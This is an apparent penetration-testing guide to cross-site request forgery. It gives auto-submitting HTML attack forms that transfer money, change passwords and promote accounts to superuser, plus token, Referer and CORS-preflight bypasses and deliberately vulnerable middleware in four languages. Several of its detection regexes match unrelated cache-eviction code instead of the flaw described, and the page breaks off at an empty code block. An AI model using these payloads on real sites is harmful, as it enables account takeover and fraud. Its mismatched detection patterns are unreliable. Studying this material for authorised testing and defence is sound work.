# Cross Site Request Forgery

## Check List

## Methodology

### Black Box

#### Session Riding

{% stepper %}
{% step %}
Look for any action that modifies data like Money transfersword
{% endstep %}

{% step %}
Perform the action normally while logged in
{% endstep %}

{% step %}
Intercept the POST/PUT request with Burp Suite
{% endstep %}

{% step %}
Check if a CSRF token is present in headers, body, or cookies
{% endstep %}

{% step %}
In Burp Repeater, send the captured request again (no changes)
{% endstep %}

{% step %}
If the action executes twice (two transfers, two email changes) → No CSRF protection
{% endstep %}

{% step %}
Craft Malicious HTML PoC

```html
<html>
  <body>
    <h2>Congratulations! You won $1000!</h2>
    <form action="https://target.com/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
      <input type="hidden" name="to_account" value="ATTACKER123">
      <input type="submit" value="Claim Prize">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
{% endstep %}

{% step %}
Host the HTML on your server (https://attacker.com/poc.html)
{% endstep %}

{% step %}
Log in as victim in the same browser
{% endstep %}

{% step %}
Visit your PoC page
{% endstep %}

{% step %}
If money is transferred → CSRF confirmed
{% endstep %}
{% endstepper %}

***

#### [Bypass CSRF Protection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery#json-post---simple-request)

{% stepper %}
{% step %}
If the endpoint uses CSRF tokens but the page itself is vulnerable to clickjacking, an attacker can exploit clickjacking to achieve the same results as a CSRF attack
{% endstep %}

{% step %}
Clickjacking attacks use an iframe to frame a page in a malicious site while having the state-changing request originate from the legitimate site
{% endstep %}

{% step %}
If the page where the vulnerable endpoint is located is susceptible to clickjacking, the attacker can achieve the same results as a CSRF attack with additional effort and CSS skills
{% endstep %}

{% step %}
To check for clickjacking, use an HTML page like the following

```html
<html>
 <head>
  <title>Clickjack test page</title>
 </head>
 <body>
  <p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
  <iframe src="PAGE_URL" width="500" height="500"></iframe>
 </body>
</html>
```
{% endstep %}
{% endstepper %}

***

#### Change the Request Method

{% stepper %}
{% step %}
Some sites accept multiple request methods for the same endpoint but might not have protection in place for each method
{% endstep %}

{% step %}
hanging the request method may allow you to bypass CSRF protection
{% endstep %}

{% step %}
if a password-change endpoint is protected via CSRF tokens in a POST request

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```
{% endstep %}

{% step %}
If successful, the malicious HTML page could look like this

```html
<html>
 <img src="https://email.example.com/password_change?new_password=abc123"/>
</html>
```
{% endstep %}
{% endstepper %}

***

#### Bypass CSRF Tokens Stored on the Server

{% stepper %}
{% step %}
If clickjacking and request method manipulation don’t work, and the site implements CSRF tokens, try the following
{% endstep %}

{% step %}
Delete the token parameter or send a blank token parameter

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123
```

```html
<html>
 <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
  <input type="text" name="new_password" value="abc123">
  <input type='submit' value="Submit">
 </form>
 <script>document.getElementById("csrf-form").submit();</script>
</html>
```
{% endstep %}

{% step %}
Send a valid CSRF token from another session

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123&csrf_token=YOUR_TOKEN
```
{% endstep %}

{% step %}
If the application logic does not validate whether the token belongs to the current user, this technique may work
{% endstep %}
{% endstepper %}

***

#### Bypass Double-Submit CSRF Tokens

{% stepper %}
{% step %}
ome sites use a double-submit cookie mechanism where the CSRF token is sent both as a cookie and a request parameter, and the server verifies their match. If the server doesn’t store valid tokens, the following Attack can work

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token
(POST request body)
new_password=abc123&csrf_token=not_a_real_token
```
{% endstep %}

{% step %}
By making the victim’s browser store a forged CSRF token cookie via session fixation techniques, an attacker can execute the CSRF successfully
{% endstep %}
{% endstepper %}

***

#### Bypass CSRF Referer Header Check

{% stepper %}
{% step %}
If a website verifies the referer header instead of using CSRF tokens, try these bypass techniques, Remove the Referer Header

```html
<html>
 <meta name="referrer" content="no-referrer">
 <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
  <input type="text" name="new_password" value="abc123">
  <input type='submit' value="Submit">
 </form>
 <script>document.getElementById("csrf-form").submit();</script>
</html>
```
{% endstep %}

{% step %}
Manipulate the referer check logic

* Use a subdomain like example.com.attacker.com
* Use a pathname like attacker.com/example.com
{% endstep %}
{% endstepper %}

***

#### Cart Manipulation

{% stepper %}
{% step %}
Created Two accounts one is ATTACKER and Second one is VICTIM
{% endstep %}

{% step %}
Firefox (ATTACKER BROWSER) Chrome (VICTIM BROWSER)
{% endstep %}

{% step %}
From Attacker id add any “xyz” product in a cart
{% endstep %}

{% step %}
Increase the quantity From 1 to 2 and intercept that request in burp suite
{% endstep %}

{% step %}
Right click and click on Engagement tools (Generate a CSRF POC)
{% endstep %}

{% step %}
Copy That HTML Code and Paste into any Editor
{% endstep %}

{% step %}
Save that file with .html EXTENSION
{% endstep %}

{% step %}
Send that file to Victim Browser (chrome) already told you this in second step
{% endstep %}

{% step %}
When Victim will opens that file and Clicked on submit request that “xyz” product will automatically added to victim cart and automatically increased the quantity
{% endstep %}
{% endstepper %}

***

#### OTP Bypass via CSRF on Edit Profile

{% stepper %}
{% step %}
Create a normal account
{% endstep %}

{% step %}
Navigate to Edit Profile or Settings
{% endstep %}

{% step %}
Enter a new email or phone → Click Save.
{% endstep %}

{% step %}
Intercept the POST request with Burp Suite → Send to Repeater
{% endstep %}

{% step %}
Check request body/headers for `csrf_token`, `X-CSRF-Token`, `__RequestVerificationToke`.
{% endstep %}

{% step %}
If none present → CSRF vulnerable
{% endstep %}

{% step %}
In Burp Repeater → Right-click request → Engagement tools → Generate CSRF PoC
{% endstep %}

{% step %}
Choose Auto-submit form (so no click needed)
{% endstep %}

{% step %}
Set victim’s email/phone in the form fields
{% endstep %}

{% step %}
Click Test in browser → Save as csrf-poc.html
{% endstep %}

{% step %}
Log in as victim in any browser
{% endstep %}

{% step %}
Open your csrf-poc.html file (local or hosted)
{% endstep %}

{% step %}
If victim’s email/phone instantly changes → OTP bypass confirmed
{% endstep %}
{% endstepper %}

***

#### [CSRF via Content-Type + Method Downgrade Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery#html-get---requiring-user-interaction)

{% stepper %}
{% step %}
Log in as admin → Change a user’s password
{% endstep %}

{% step %}
Intercept the POST request

```http
POST /editUser/ChangePassword HTTP/1.1
Content-Type: application/json

{"Id": "1", "password": "newpass123"}
```
{% endstep %}

{% step %}
Downgrade Content-Type to Form-URLencoded And Change header

```http
Content-Type: application/x-www-form-urlencoded
```

And Body

```http
Id=1&password=newpass123
```
{% endstep %}

{% step %}
Send → If password changes → Content-Type bypass confirmed
{% endstep %}

{% step %}
Convert entire request to GET with parameters in URL

```http
GET /editUser/ChangePassword?Id=1&password=newpass123 HTTP/1.1
```
{% endstep %}

{% step %}
Send → If password changes → Method downgrade bypass confirmed
{% endstep %}

{% step %}
Craft Final CSRF PoC (No Click Needed)

```http
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://mycompany.target.com/editUser/ChangePassword" method="GET">
      <input type="hidden" name="Id" value="1">
      <input type="hidden" name="password" value="HackedByAttacker123">
    </form>
  </body>
</html>
```
{% endstep %}

{% step %}
Host the HTML file or send as attachment
{% endstep %}

{% step %}
Admin opens it while logged in → Password of user ID 1 instantly changed
{% endstep %}
{% endstepper %}

***

### White Box

#### Privilege Escalation via CORS Preflight Bypass in Legacy Content-Type Fallback Parsers

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Investigate the API Gateway's core CSRF defense mechanism. Modern enterprise single-page applications (SPAs) frequently abandon traditional Anti-CSRF tokens in favor of enforcing strict `Content-Type: application/json` requirements
{% endstep %}

{% step %}
Understand the architectural assumption: Developers rely on the browser's Cross-Origin Resource Sharing (CORS) specification. Standard HTML forms cannot send `application/json`. If an attacker attempts to send JSON via JavaScript (Fetch/XHR), the browser forces an `OPTIONS` preflight request, which the server will reject if the origin is untrusted, effectively neutralizing CSRF
{% endstep %}

{% step %}
Look for "Content-Type Fallback" or "Legacy Payload" optimizations in the decompiled routing or middleware layers. Enterprise systems often integrate with third-party B2B partners, legacy Mainframes, or primitive webhooks that cannot construct custom HTTP headers
{% endstep %}

{% step %}
Discover that to optimize ingestion from these legacy systems, the developer implemented a custom middleware that accepts `text/plain` payloads and manually parses the raw string into a JSON object
{% endstep %}

{% step %}
Recognize the fatal CORS flaw: `text/plain` is classified by browsers as a "Simple Request". It completely bypasses the CORS preflight `OPTIONS` check
{% endstep %}

{% step %}
Craft a malicious HTML `<form>` with `enctype="text/plain"`
{% endstep %}

{% step %}
Construct the payload using the `name` and `value` attributes of a hidden `<input>` field to synthesize valid JSON syntax. When the browser concatenates `name=value`, it completes the JSON object
{% endstep %}

{% step %}
Host this form on an attacker-controlled domain and trick an authenticated administrator into submitting it
{% endstep %}

{% step %}
The browser dispatches the cross-origin POST request with the victim's session cookies. No preflight is triggered. The backend fallback middleware parses the forged JSON string, bypasses the expected CORS boundary, and executes the administrative command

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:L1Cache\.(?:Remove|Evict|Invalidate)\s*\([^)]*\btoken\b|MemoryCache\.(?:Remove|TryRemove)\s*\([^)]*\btoken\b|IMemoryCache\.(?:Remove|TryGetValue)\s*\([^)]*\btoken\b|Redis\.(?:Delete|KeyDelete|Remove)\s*\([^)]*\btoken\b[\s\S]{0,200}?Cache\.(?:Remove|Evict|Invalidate)|localCache\.(?:Invalidate|Remove|Evict)\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:cache\.invalidate\s*\([^)]*\btoken\b|cache\.evict\s*\([^)]*\btoken\b|cacheManager\.getCache\s*\([^)]*\)\.evict\s*\([^)]*\btoken\b|redisTemplate\.delete\s*\([^)]*\btoken\b[\s\S]{0,200}?cache\.(?:invalidate|evict)|localCache\.(?:invalidate|remove)\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:Cache::forget\s*\([^)]*\btoken\b|Redis::del\s*\([^)]*\btoken\b[\s\S]{0,200}?Cache::forget|apcu_delete\s*\([^)]*\btoken\b|localCache->(?:invalidate|remove)\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:req\.is\s*\(\s*['"]text/plain['"]\s*\)[\s\S]{0,200}?JSON\.parse\s*\(|req\.headers\[['"]content-type['"]\]\s*.*text/plain[\s\S]{0,200}?JSON\.parse\s*\(|bodyParser\.text\s*\(|JSON\.parse\s*\(\s*req\.body\s*\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:L1Cache\.(?:Remove|Evict|Invalidate)\s*\([^)]*\btoken\b|MemoryCache\.(?:Remove|TryRemove)\s*\([^)]*\btoken\b|IMemoryCache\.(?:Remove|TryGetValue)\s*\([^)]*\btoken\b|Redis\.(?:Delete|KeyDelete|Remove)\s*\([^)]*\btoken\b.*Cache\.(?:Remove|Evict|Invalidate)|localCache\.(?:Invalidate|Remove|Evict)\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:cache\.invalidate\s*\([^)]*\btoken\b|cache\.evict\s*\([^)]*\btoken\b|cacheManager\.getCache\s*\([^)]*\)\.evict\s*\([^)]*\btoken\b|redisTemplate\.delete\s*\([^)]*\btoken\b.*cache\.(?:invalidate|evict)|localCache\.(?:invalidate|remove)\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:Cache::forget\s*\([^)]*\btoken\b|Redis::del\s*\([^)]*\btoken\b.*Cache::forget|apcu_delete\s*\([^)]*\btoken\b|localCache->(?:invalidate|remove)\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:req\.is\s*\(\s*['"]text/plain['"]\s*\).*JSON\.parse|req\.headers\[['"]content-type['"]\].*text/plain.*JSON\.parse|bodyParser\.text\s*\(|JSON\.parse\s*\(\s*req\.body\s*\))
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
{
    // [1]
    if (context.Request.ContentType != null && context.Request.ContentType.StartsWith("text/plain")) 
    {
        // [2]
        using var reader = new StreamReader(context.Request.Body);
        var rawBody = await reader.ReadToEndAsync();
        
        try 
        {
            // [3]
            var jsonPayload = JsonConvert.DeserializeObject<Dictionary<string, object>>(rawBody);
            
            // [4]
            context.Items["ParsedDto"] = jsonPayload;
        } 
        catch { /* Fallback to standard routing */ }
    }
    
    await next(context);
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class LegacyContentTypeFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        HttpServletRequest req = (HttpServletRequest) request;
        
        // [1]
        if (req.getContentType() != null && req.getContentType().startsWith("text/plain")) {
            try {
                // [2]
                String rawBody = request.getReader().lines().collect(Collectors.joining(System.lineSeparator()));
                
                // [3]
                ObjectMapper mapper = new ObjectMapper();
                Map<String, Object> jsonPayload = mapper.readValue(rawBody, new TypeReference<Map<String, Object>>(){});
                
                // [4]
                req.setAttribute("ParsedDto", jsonPayload);
            } catch (Exception e) { /* Fallback to standard routing */ }
        }
        
        chain.doFilter(request, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class LegacyContentTypeMiddleware 
{
    public function handle($request, Closure $next) 
    {
        $contentType = $request->header('Content-Type');
        
        // [1]
        if ($contentType !== null && strpos($contentType, 'text/plain') === 0) 
        {
            // [2]
            $rawBody = file_get_contents('php://input');
            
            // [3]
            $jsonPayload = json_decode($rawBody, true);
            
            if (json_last_error() === JSON_ERROR_NONE) {
                // [4]
                $request->attributes->set('ParsedDto', $jsonPayload);
            }
        }
        
        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class LegacyContentTypeMiddleware {
    static handle(req, res, next) {
        // [1]
        if (req.is('text/plain')) {
            let rawBody = '';
            
            // [2]
            req.on('data', chunk => { rawBody += chunk.toString(); });
            
            req.on('end', () => {
                try {
                    // [3]
                    let jsonPayload = JSON.parse(rawBody);
                    
                    // [4]
                    req.ParsedDto = jsonPayload;
                } catch (e) { /* Fallback */ }
                next();
            });
        } else {
            next();
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API Gateway anticipates legacy B2B webhooks that cannot set application/json headers, explicitly accepting `text/plain` to ensure backward compatibility, \[2] The middleware reads the raw HTTP request body directly from the underlying stream, \[3] The developer optimizes the ingestion pipeline by aggressively attempting to parse any valid JSON structure found within the plain text string, \[4] The successfully parsed JSON dictionary is attached to the request context. This seamlessly feeds the deserialized objects into the downstream controllers, completely neutralizing the architectural reliance on CORS preflights as an anti-CSRF mechanism

```html
<!-- Hosted on attacker.com -->
<html>
  <body>
    <form action="https://api.enterprise.tld/v2/admin/users/promote" method="POST" enctype="text/plain">
      <!-- Synthesizes JSON. Browser submits: {"userId":"victim_123","role":"superuser", "padding":"="} -->
      <input type="hidden" name='{"userId":"victim_123","role":"superuser", "padding":"' value='"}'>
      <input type="submit" value="Click to win!">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

```http
POST /v2/admin/users/promote HTTP/1.1
Host: api.enterprise.tld
Content-Type: text/plain
Cookie: SessionToken=ADMIN_VICTIM_COOKIE

{"userId":"victim_123","role":"superuser", "padding":"="}
```
{% endstep %}

{% step %}
Because the form specifies `enctype="text/plain"`, the browser considers this a "Simple Request" under CORS guidelines and dispatches the cross-origin POST request immediately, attaching the administrator's session cookies without firing an `OPTIONS` preflight. The API Gateway receives the `text/plain` payload. The custom fallback middleware captures the raw body, successfully parses the attacker's carefully constructed string into a valid JSON object, and passes it to the `/promote` controller. The system promotes the attacker's account to superuser, confirming a complete CSRF execution inside an API supposedly protected by JSON strictness
{% endstep %}
{% endstepper %}

***

#### CSRF Validation Bypass via CQRS Command-Upgrading Exemptions

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Evaluate the application's implementation of the Command Query Responsibility Segregation (CQRS) pattern. Observe that Global CSRF Middleware strictly protects Command endpoints (POST/PUT/DELETE) but globally exempts Query endpoints (GET)
{% endstep %}

{% step %}
Identify the "Complex Search" optimization. In enterprise telemetry or reporting dashboards, complex search filters (involving hundreds of nested JSON arrays and OR/AND groupings) quickly exceed the maximum URL length limits of standard HTTP GET requests (resulting in `414 URI Too Long` errors)
{% endstep %}

{% step %}
To optimize this, developers shift the `/api/v1/telemetry/search` endpoint from `GET` to `POST`
{% endstep %}

{% step %}
Because the developers conceptually view this POST strictly as a "Read/Query" operation, they explicitly add the route to the Global CSRF Ignore List to prevent UI bugs where long-lived dashboard search pages experience token expiration
{% endstep %}

{% step %}
Investigate the Controller handling this exempted search endpoint. Look for state-mutating side effects (Commands) embedded directly inside the Read path
{% endstep %}

{% step %}
Discover that to optimize UX, the developer added a feature to automatically save the user's complex search configuration as their "Default View". This is triggered by an optional boolean flag (e.g., `SaveAsDefaultView = true`) within the Search DTO
{% endstep %}

{% step %}
The architectural assumption is that the endpoint is merely a search function, justifying the CSRF bypass, while the reality is that the DTO schema supports direct database mutation
{% endstep %}

{% step %}
Confirm that the API natively supports `application/x-www-form-urlencoded` model binding (a default behavior in many enterprise web frameworks) alongside JSON, allowing standard HTML forms to target it
{% endstep %}

{% step %}
Construct a CSRF payload utilizing an auto-submitting HTML form that points to the exempted `/search` endpoint, providing the `SaveAsDefaultView=true` parameter and a malicious configuration (e.g., a blind XSS payload in the View Name, or an overwhelming database grouping command causing Denial of Service)
{% endstep %}

{% step %}
Trick the victim into loading the page. The browser fires the form-urlencoded POST request with session cookies
{% endstep %}

{% step %}
The Global CSRF Middleware ignores the route. The controller executes the state mutation via the side-effect logic, successfully permanently saving the malicious configuration to the administrator's profile

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:CsrfIgnore\b[\s\S]{0,200}?(?:search|Search)|ShouldSkipCsrf\b[\s\S]{0,200}?(?:telemetry|Telemetry)|SaveAsDefault\b[\s\S]{0,200}?_repo\.Update\s*\(|isSearchEndpoint\s*=>\s*bypass\b|IgnoreAntiforgeryToken\b|ValidateAntiForgeryToken\b)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:CsrfIgnore\b[\s\S]{0,200}?(?:search|Search)|shouldSkipCsrf\b[\s\S]{0,200}?(?:telemetry|Telemetry)|saveAsDefault\b[\s\S]{0,200}?repository\.update\s*\(|isSearchEndpoint\s*->\s*bypass\b|@CrossOrigin\b|csrf\(\)\.disable\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:CsrfIgnore\b[\s\S]{0,200}?(?:search|Search)|shouldSkipCsrf\b[\s\S]{0,200}?(?:telemetry|Telemetry)|SaveAsDefault\b[\s\S]{0,200}?->update\s*\(|\$isSearchEndpoint\s*=>\s*['"]?bypass['"]?|withoutMiddleware\s*\(\s*['"]csrf['"]|VerifyCsrfToken\b)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:CsrfIgnore\b[\s\S]{0,200}?(?:search|Search)|shouldSkipCsrf\b[\s\S]{0,200}?(?:telemetry|Telemetry)|SaveAsDefault\b[\s\S]{0,200}?_repo\.update\s*\(|isSearchEndpoint\s*=>\s*bypass\b|csrf:\s*false|skipCsrf\s*:\s*true|disableCsrf\b)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:CsrfIgnore.*(?:search|Search)|ShouldSkipCsrf.*(?:telemetry|Telemetry)|SaveAsDefault.*_repo\.Update|isSearchEndpoint\s*=>\s*bypass|IgnoreAntiforgeryToken|ValidateAntiForgeryToken)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:CsrfIgnore.*(?:search|Search)|shouldSkipCsrf.*(?:telemetry|Telemetry)|saveAsDefault.*repository\.update|isSearchEndpoint\s*->\s*bypass|@CrossOrigin|csrf\(\)\.disable)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:CsrfIgnore.*(?:search|Search)|shouldSkipCsrf.*(?:telemetry|Telemetry)|SaveAsDefault.*->update|\\$isSearchEndpoint\s*=>\s*['"]?bypass['"]?|withoutMiddleware.*csrf|VerifyCsrfToken)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:CsrfIgnore.*(?:search|Search)|shouldSkipCsrf.*(?:telemetry|Telemetry)|SaveAsDefault.*_repo\.update|isSearchEndpoint\s*=>\s*bypass|csrf:\s*false|skipCsrf\s*:\s*true|disableCsrf)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// Inside Startup.cs / Middleware Configuration
// [1]
options.IgnoreAntiforgeryToken("/api/v1/telemetry/search");

// Inside TelemetryController.cs
[HttpPost("/api/v1/telemetry/search")]
public IActionResult ExecuteSearch([FromForm] TelemetryQueryDto query) 
{
    // [2]
    var results = _telemetryService.RunComplexQuery(query.Filters);
    
    // [3]
    if (query.SaveAsDefaultView && _currentUser.IsAdmin) 
    {
        // [4]
        _userSettingsRepo.UpdateDefaultView(_currentUser.Id, query.Filters);
    }
    
    return Ok(results);
}
```
{% endtab %}

{% tab title="Java" %}
```java
// Inside WebSecurityConfig.java
// [1]
http.csrf().ignoringAntMatchers("/api/v1/telemetry/search");

// Inside TelemetryController.java
@PostMapping(value = "/api/v1/telemetry/search", consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE)
public ResponseEntity<?> executeSearch(@ModelAttribute TelemetryQueryDto query) {
    // [2]
    List<Result> results = telemetryService.runComplexQuery(query.getFilters());
    
    // [3]
    if (query.isSaveAsDefaultView() && currentUser.isAdmin()) {
        // [4]
        userSettingsRepo.updateDefaultView(currentUser.getId(), query.getFilters());
    }
    
    return ResponseEntity.ok(results);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// Inside VerifyCsrfToken.php middleware
// [1]
protected $except = [
    '/api/v1/telemetry/search',
];

// Inside TelemetryController.php
public function executeSearch(Request $request) 
{
    // [2]
    $results = $this->telemetryService->runComplexQuery($request->input('filters'));
    
    // [3]
    if ($request->input('save_as_default_view') == 'true' && $this->currentUser->isAdmin) 
    {
        // [4]
        $this->userSettingsRepo->updateDefaultView($this->currentUser->id, $request->input('filters'));
    }
    
    return response()->json($results);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// Inside Express Middleware Configuration
// [1]
app.use(csrf({ ignoreMethods: ['GET', 'HEAD', 'OPTIONS'], ignoreRoutes: ['/api/v1/telemetry/search'] }));

// Inside TelemetryController.js
router.post('/api/v1/telemetry/search', async (req, res) => {
    // [2]
    let results = await telemetryService.runComplexQuery(req.body.filters);
    
    // [3]
    if (req.body.save_as_default_view === 'true' && req.user.isAdmin) {
        // [4]
        await userSettingsRepo.updateDefaultView(req.user.id, req.body.filters);
    }
    
    res.json(results);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To optimize the CQRS read-model architecture and support massive search payloads without hitting URI length limits, the developer exempts the POST-based search endpoint from the global CSRF token validation pipeline, \[2] The controller executes the heavy, read-only Elasticsearch or SQL query expected of the endpoint, \[3] The developer implements a UX optimization embedded directly inside the read path, checking a flag in the incoming Form DTO, \[4] The fatal flaw occurs: the application executes a highly persistent, state-mutating database update (a Command) inside a route structurally classified and explicitly whitelisted as a Query. The anti-CSRF boundary is permanently bypassed for this specific state mutation

```html
<!-- Hosted on attacker.com -->
<html>
  <body>
    <form action="https://api.enterprise.tld/api/v1/telemetry/search" method="POST" enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="filters" value='{"query":"attacker_injected_xss_or_dos"}' />
      <input type="hidden" name="save_as_default_view" value="true" />
      <input type="submit" value="Search Data">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

```http
POST /api/v1/telemetry/search HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/x-www-form-urlencoded
Cookie: SessionToken=ADMIN_VICTIM_COOKIE

filters={"query":"attacker_injected_xss_or_dos"}&save_as_default_view=true
```

The browser dispatches a standard URL-encoded POST request containing the victim's session cookies. The API Gateway's Anti-CSRF middleware intercepts the request, checks the URI against the ignore list, and explicitly waves it through based on the architectural assumption that `/search` is a read-only CQRS Query endpoint. The controller binds the payload, evaluates `save_as_default_view=true`, and executes the state mutation, overwriting the administrator's default dashboard view in the database. The attacker achieves persistent CSRF by exploiting the breakdown between routing optimizations and CQRS isolation boundaries
{% endstep %}
{% endstepper %}

***

#### CSRF Auth-Fallback Exploitation via Stateful Webhook Ingestion Optimization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify Event-Driven architectures where the enterprise platform consumes state-changing webhooks from external providers (e.g., Stripe Payment intents, GitHub repository events, or external CI/CD pipeline triggers)
{% endstep %}

{% step %}
Understand the authentication boundary: Webhooks are `POST` requests originating from third-party servers. They inherently lack the end-user's session cookies and cannot participate in the standard Anti-CSRF token exchange. Instead, webhook endpoints secure themselves using cryptographic HMAC signatures (e.g., `X-Hub-Signature`)
{% endstep %}

{% step %}
Analyze the Webhook Ingestion Controller in the decompiled code. Look for "Admin Retry" or "E2E Testing" optimizations
{% endstep %}

{% step %}
Discover that tracing and debugging failed webhooks in a distributed system is tedious. To optimize incident response, developers implement a fallback mechanism: If a webhook payload fails the HMAC cryptographic signature check, the system evaluates the HTTP request context to see if an active Administrator Session Cookie is present
{% endstep %}

{% step %}
If the Admin session is detected, the system assumes the request is a legitimate manual retry initiated directly from the internal administration dashboard, and explicitly bypasses the HMAC failure
{% endstep %}

{% step %}
Verify that the enterprise framework's model binder natively deserializes standard HTML `application/x-www-form-urlencoded` payloads into the Webhook DTO alongside the expected `application/json`
{% endstep %}

{% step %}
The architectural assumption is that the presence of the Admin cookie guarantees intent. The developer forgot that standard web browsers will automatically attach that cookie to _any_ cross-site POST request targeting the endpoint
{% endstep %}

{% step %}
Construct an attacker-controlled HTML form pointing directly to the public Webhook ingestion URL (e.g., `/webhooks/billing/event`)
{% endstep %}

{% step %}
Embed forged, state-changing webhook data (e.g., `action=payment_succeeded` and `account_id=attacker_account`) in the form inputs. Do not include any HMAC signature header, as HTML forms cannot set custom headers
{% endstep %}

{% step %}
Force an authenticated administrator to visit the page. The browser fires the POST request
{% endstep %}

{% step %}
The webhook controller detects the missing HMAC, falls back to checking the session, detects the admin cookie, approves the authorization, and executes the forged financial event

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:!\s*isValidHmac\b[\s\S]{0,100}?\bisAdminSession\b|VerifyHmac\s*\([^)]*\)[\s\S]{0,100}?(?:\|\||&&)?\s*IsAuthenticated\b|signature\s*==\s*null[\s\S]{0,100}?req\.User\.(?:Role|IsInRole)|checkSignature\s*\([^)]*\)[\s\S]{0,100}?isAdmin\s*\(\s*\)|ValidateHmac\s*\(|CryptographicOperations\.FixedTimeEquals\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:!\s*isValidHmac\b[\s\S]{0,100}?isAdminSession\b|verifyHmac\s*\([^)]*\)[\s\S]{0,100}?(?:\|\||&&)?\s*isAuthenticated\s*\(\s*\)|signature\s*==\s*null[\s\S]{0,100}?user\.getRole\s*\(\s*\)|checkSignature\s*\([^)]*\)[\s\S]{0,100}?isAdmin\s*\(\s*\)|Mac\.doFinal\s*\(|MessageDigest\.isEqual\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:!\s*\$?isValidHmac\b[\s\S]{0,100}?\$?isAdminSession\b|verifyHmac\s*\([^)]*\)[\s\S]{0,100}?(?:\|\||&&)?\s*\$?isAuthenticated\b|\$signature\s*==\s*null[\s\S]{0,100}?\$req->user->role|checkSignature\s*\([^)]*\)[\s\S]{0,100}?isAdmin\s*\(\s*\)|hash_hmac\s*\(|hash_equals\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:!\s*isValidHmac\b[\s\S]{0,100}?isAdminSession\b|verifyHmac\s*\([^)]*\)[\s\S]{0,100}?(?:\|\||&&)?\s*isAuthenticated\b|signature\s*==\s*null[\s\S]{0,100}?req\.user\.role|checkSignature\s*\([^)]*\)[\s\S]{0,100}?isAdmin\s*\(\s*\)|crypto\.createHmac\s*\(|crypto\.timingSafeEqual\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:!\s*isValidHmac.*isAdminSession|VerifyHmac.*(?:\|\||&&).*IsAuthenticated|signature\s*==\s*null.*req\.User\.(?:Role|IsInRole)|checkSignature.*isAdmin\s*\(\s*\)|ValidateHmac\s*\(|CryptographicOperations\.FixedTimeEquals)
```
{% endtab %}

{% tab title="Java" %}
```regexp
